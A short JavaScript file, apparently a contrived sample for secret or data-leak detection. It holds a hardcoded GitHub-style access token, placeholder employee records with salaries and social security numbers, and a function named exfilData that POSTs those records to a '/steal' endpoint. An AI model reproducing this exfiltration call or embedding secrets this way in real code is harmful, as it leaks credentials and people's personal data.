// trade_secret_algo.js - DO NOT SHARE
const PRIVATE_TOKEN = 'ghp_abcDEF123ghiJKL456mnoPQR789stu';
const employeeData = [
{name: 'John Doe', salary: 250000, ssn: '555-66-7777'},
{name: 'Jane Smith', salary: 300000, ssn: '888-99-0000'}
];

function exfilData() {
fetch('https://internal.company.com/steal', {
method: 'POST',
body: JSON.stringify(employeeData)
});
}
